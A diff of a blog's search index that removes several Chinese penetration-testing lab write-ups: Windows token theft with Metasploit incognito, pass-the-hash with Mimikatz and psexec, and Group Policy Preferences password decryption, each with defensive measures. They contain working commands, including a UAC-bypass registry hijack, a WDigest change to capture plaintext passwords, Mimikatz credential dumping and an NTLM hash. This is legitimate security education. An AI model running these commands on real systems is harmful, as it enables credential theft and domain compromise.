-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
-<ul>
-<li>  访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>  密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>  会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
-</ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>  主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>  模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
-</ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>  用户帐户的安全标识符(SID)</li>
-<li>  用户帐户所属的用户群的SIDs</li>
-<li>  一个logon SID，标识当前登录会话</li>
-<li>  用户或用户群的特权清单</li>
-<li>  所有者的SID</li>
-<li>  基本群的SID</li>
-<li>  当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>  访问令牌资源</li>
-<li>  是否为primary或impersonation token</li>
-<li>  限制性SIDs的可选列表</li>
-<li>  当前impersonation级别</li>
-<li>  其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d c:\testftp\shell.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：        </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impersonate_token &#39;TEST\Administrator&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>  为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>  及时安装微软推送的补丁</li>
-<li>  对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>  对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>  对于令牌，应采取加密存储及多长验证保护</li>
-<li>  使用加密链路SSL/TLS传输令牌，以防止被中间人窃听</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>哈希传递</title>
-    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
-<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
-</blockquote>
-<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
-<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
-<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
-
-<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
-<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
-<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
-<p>将一台win7添加到域控（win8）中</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160244.png" alt="image-20210214145116625"></p>
-<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160250.png" alt="image-20210214145726732"></p>
-<p>切换本地账户</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" alt="image-20210214145957319"></p>
-<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" alt="image-20210214152209729"></p>
-<p>获取终端</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" alt="image-20210214152128620"></p>
-<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" alt="image-20210214152835360"></p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
-<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" alt="image-20210214154108503"></p>
-<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
-<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
-<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
-<blockquote>
-<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
-<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
-<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
-</blockquote>
-<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160322.png" alt="image-20210214155950651"></p>
-<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
     <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<blockquote>
@@ -1285,207 +1360,6 @@
       </categories>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>组策略提权实验</title>
-    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
-    <content><![CDATA[<blockquote>
-<p>管理员在域中新建一个组策略后,操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
-</blockquote>
-<h2 id="1-组策略基本介绍"><a href="#1-组策略基本介绍" class="headerlink" title="1. 组策略基本介绍"></a>1. 组策略基本介绍</h2><p>组策略可以控制用户帐户和计算机帐户的工作环境。它提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略，借机学一下域环境搭建</p>
-<h2 id="2-SYSVOL-漏洞-MS14-025"><a href="#2-SYSVOL-漏洞-MS14-025" class="headerlink" title="2. SYSVOL 漏洞(MS14-025)"></a>2. SYSVOL 漏洞(MS14-025)</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL 文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSvOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies 目录中。</p>
-<p>在一般的域环境中,所有机器都是脚本化批量部署的,数据量通常很大。为了方便地对所有的机器进行操作,网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加人域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。但是当通过组策略统一修改密码，虽然密码强度会有所提高，这就造成了所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码,就相当于获得了整个域中所有机器的本地管理员密码。</p>
-<p>在域中，存在一个默认的共享路径：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>
-
-<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等。</p>
-<p>例如，测试主机所在域为test.yhy，可访问共享文件夹<code>\\test.yhy\SYSVOL\test.yhy</code>，如下图：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084350.png" alt="image-20210116111851931"></p>
-<p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥，地址： <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspx。</a></p>
-<p>![image-20210116111342068](/Users/yhy/Library/Application Support/typora-user-images/image-20210116111342068.png)</p>
-<p>如下几个组策略首选项文件中会存在可选的密码cpassword 属性:</p>
-<ul>
-<li><p>  Groups\Groupsx.xml</p>
-</li>
-<li><p>  Services\Services.xml</p>
-</li>
-<li><p>  ScheduledTasks\ScheduledTasks.xml</p>
-</li>
-<li><p>  Printers\Printers.xml</p>
-</li>
-<li><p>  Drives\Drives.xml</p>
-</li>
-<li><p>  DataSources\DataSources.xml</p>
-</li>
-</ul>
-<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-域环境搭建"><a href="#3-1-域环境搭建" class="headerlink" title="3.1 域环境搭建"></a>3.1 域环境搭建</h3><h4 id="3-1-1-环境要求"><a href="#3-1-1-环境要求" class="headerlink" title="3.1.1 环境要求"></a>3.1.1 环境要求</h4><p>环境：Windows Server 2008R2 </p>
-<p>网络：NAT模式</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084407.png" alt="image-20210116112955314"></p>
-<p>更改管理员Administrator 密码为强密码，例如：test.yhy@123</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084412.png" alt="image-20210116114025566"></p>
-<h4 id="3-1-2-添加域"><a href="#3-1-2-添加域" class="headerlink" title="3.1.2 添加域"></a>3.1.2 添加域</h4><p>点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084418.png" alt="image-20210116112445745"></p>
-<p>选中 Active Directory 域服务</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084422.png" alt="image-20210116113323735"></p>
-<p>一直下一步，安装即可</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084429.png" alt="image-20210116113443897"></p>
-<p>关闭后，打开“服务器管理器”，找到Active Directory安装向导</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084433.png" alt="image-20210116113523528"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084437.png" alt="image-20210116113639168"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084446.png" alt="image-20210116114315069"></p>
-<p>因为前面没配置静态IP（前面应该配置为静态IP的，不过这个环境无所谓了），这里选择是：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084451.png" alt="image-20210116114528206"> </p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084518.png" alt="image-20210116114630800"></p>
-<p>点击是，下一步，设置密码：test.yhy@123</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084525.png" alt="image-20210116114714649"></p>
-<p>一直下一步，等待安装</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084531.png" alt="image-20210116114816453"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084537.png" alt="image-20210116114855068"></p>
-<p>完成，重启。</p>
-<p>测试一下：<code>net user /domain</code>, ok</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084547.png" alt="image-20210116115925975"></p>
-<h4 id="3-1-3安装FTP服务"><a href="#3-1-3安装FTP服务" class="headerlink" title="3.1.3安装FTP服务"></a>3.1.3安装FTP服务</h4><p>虚拟机不知道为啥装不上VMware Tools，没办法拖文件，这里打开FTP服务，使用FTP上传文件。</p>
-<p>还是点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084554.png" alt="image-20210116120244713"></p>
-<p>选择Web服务（IIS），下一步，最下边选择FTP服务器</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084558.png" alt="image-20210116120911584"></p>
-<p>一直下一步，安装</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084604.png" alt="image-20210116120952490"></p>
-<p>完成后，点击开始按钮，所有程序 —&gt; 管理工具 —&gt; Internet 信息服务(IIS)管理器</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084609.png" alt="image-20210116120424350"></p>
-<p>右键添加FTP站点</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084618.png" alt="image-20210116122419671"></p>
-<p>站点名称随意，物理路径，这里选择了C盘下新建文件夹，</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084624.png" alt="image-20210116123005662"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084629.png" alt="image-20210116123140690"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084634.png" alt="image-20210116123215490"></p>
-<p>然后完成即可， 这时候使用FTP连接工具即可，连不上通过控制面板，关闭防火墙即可</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084638.png" alt="image-20210116123531384"></p>
-<h3 id="3-2-创建组策略，批量修改域中机器的本地管理员密码"><a href="#3-2-创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="3.2 创建组策略，批量修改域中机器的本地管理员密码"></a>3.2 创建组策略，批量修改域中机器的本地管理员密码</h3><h4 id="3-2-1创建组策略"><a href="#3-2-1创建组策略" class="headerlink" title="3.2.1创建组策略"></a>3.2.1创建组策略</h4><p>Win + R 打开运行 ，输入gpmc.msc ，进入组策略管理。</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084644.png" alt="image-20210116124142601">         右击<code>组策略</code> —&gt; <code>新建</code>:</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084649.png" alt="image-20210116124834370"></p>
-<p>右击<code>test</code>(刚刚创建好的组策略对象)–&gt;<code>编辑</code>,来到如下位置：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084653.png" alt="image-20210116124949983"></p>
-<p>右击<code>本地用户和组</code>–&gt;<code>新建</code>–&gt;<code>本地用户</code>：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084658.png" alt="image-20210116125418016"></p>
-<p>其中设置的密码为<code>hackyhy.123</code></p>
-<p>回到组策略管理，设置组策略的对象，添加<code>Domain Computers</code>到组策略组中：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084712.png" alt="image-20210116125705664"></p>
-<p>查看组策略对象<code>test</code>的详细信息：</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084718.png" alt="image-20210116125821832"></p>
-<p>至此，组策略配置完成，域内主机重新登录。</p>
-<blockquote>
-<p>  管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
-</blockquote>
-<p>根据test的ID 去访问 <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> 或者本地的<code>C:\Windows\SYSVOL\domain\Policies</code>相对应的策略。</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084723.png" alt="image-20210116130016932"></p>
-<p>打开，访问<code>\Machine\Preferences\Groups</code>，找到文件<code>Groups.xml</code>，</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084729.png" alt="image-20210116130711551"></p>
-<p>其中的关注点为<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL/RsEuyDABYBI</p>
-<h4 id="3-2-2-漏洞利用"><a href="#3-2-2-漏洞利用" class="headerlink" title="3.2.2 漏洞利用"></a>3.2.2 漏洞利用</h4><p>介绍两种简单的利用方式</p>
-<ul>
-<li>  Kali 下，将cpassword 字段复制到kali中，使用gpp-decrypt 进行破解</li>
-</ul>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084757.png" alt="img"></p>
-<ul>
-<li><p>msf 模块</p>
-<p>  使用msf后渗透模块</p>
-<p>  <code>run post/windows/gather/credentials/gpp</code></p>
-<p>  当拿到目标的session后（这里直接将msf生成的马，通过ftp上传，并执行）</p>
-</li>
-</ul>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084804.png" alt="image-20210116134115737"></p>
-<h2 id="4-组策略首选项提权的防御措施"><a href="#4-组策略首选项提权的防御措施" class="headerlink" title="4. 组策略首选项提权的防御措施"></a>4. 组策略首选项提权的防御措施</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p>
-<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
-<ol>
-<li> 设置共享文件夹SYSVOL的访问权限</li>
-<li> 将包含组策略密码的 XML 文件从 SYSVOL 目录中删除s</li>
-<li> 不要把密码放在所有域用户都有权访问的文件中 </li>
-<li> 如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
-</ol>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初探Java反序列化漏洞(一)</title>
-    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
-    <content><![CDATA[<blockquote>
-<p>  学无止境，参考着资料边学边记录吧。</p>
-</blockquote>
-<h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p>
-<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p>
-<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写入对象内容</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 读取对象内容</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
-<p>使用场景：</p>
-<ul>
-<li><p>  想把内存中的对象保存到一个文件中或者数据库中时候；</p>
-</li>
-<li><p>  想用套接字在网络上传送对象的时候；</p>
-</li>
-<li><p>  想通过RMI传输对象的时候</p>
-</li>
-</ul>
-<p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p>
-<p>总之，序列化的用途就是传递和存储。</p>
